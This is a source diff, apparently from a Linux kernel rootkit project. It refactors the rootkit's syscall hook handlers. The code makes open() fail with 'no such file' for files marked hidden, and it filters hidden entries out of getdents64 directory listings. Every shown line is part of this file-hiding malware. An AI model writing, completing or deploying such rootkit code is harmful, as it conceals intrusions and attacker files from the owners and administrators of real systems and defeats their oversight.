@@ -37,8 +37,8 @@ bool is_hidden_file(const char *str) {
 
 #define PATH_BUFFER_SIZE 1024
 
-void sys_open_kprobe_enter_handler(char *__user filename,
-                                   struct rootkit_cmd *cmd) {
+void open_syscall_enter_handler(char *__user filename,
+                                struct rootkit_cmd *cmd) {
   cmd->data.open_data.should_fail = false;
 
   char buf[PATH_BUFFER_SIZE];
@@ -52,8 +52,8 @@ void sys_open_kprobe_enter_handler(char *__user filename,
   }
 }
 
-void sys_open_kprobe_exit_handler(struct pt_regs *syscall_regs,
-                                  struct rootkit_cmd cmd) {
+void open_syscall_exit_handler(struct pt_regs *syscall_regs,
+                               struct rootkit_cmd cmd) {
   if (cmd.data.open_data.should_fail) {
     syscall_regs->ax = -2;
   }
@@ -76,18 +76,24 @@ static void remove_hidden_from_dents(void *buf, int *nread) {
   }
 }
 
-void sys_getdents64_kprobe_exit_handler(struct pt_regs *regs,
-                                        struct rootkit_cmd syscall_metadata) {
+void getdents64_syscall_enter_handler(unsigned int buf_size,
+                                      struct linux_dirent64 *__user dirents,
+                                      struct rootkit_cmd *cmd) {
+  cmd->data.getdents_data.buf_size = buf_size;
+  cmd->data.getdents_data.dirents = dirents;
+}
+
+void getdents64_syscall_exit_handler(struct pt_regs *regs,
+                                     struct rootkit_cmd cmd) {
   int nread = *(int *)&regs->ax;
 
   if (nread <= 0) { // Operation failed or finished
     return;
   }
 
-  struct linux_dirent64 *__user dirents_user =
-      syscall_metadata.data.getdents_data.entries;
+  struct linux_dirent64 *__user dirents_user = cmd.data.getdents_data.dirents;
 
-  unsigned int dirents_user_size = syscall_metadata.data.getdents_data.buf_size;
+  unsigned int dirents_user_size = cmd.data.getdents_data.buf_size;
 
   void *buf = kmalloc(dirents_user_size, GFP_KERNEL);
   int n = copy_from_user(buf, dirents_user, dirents_user_size);
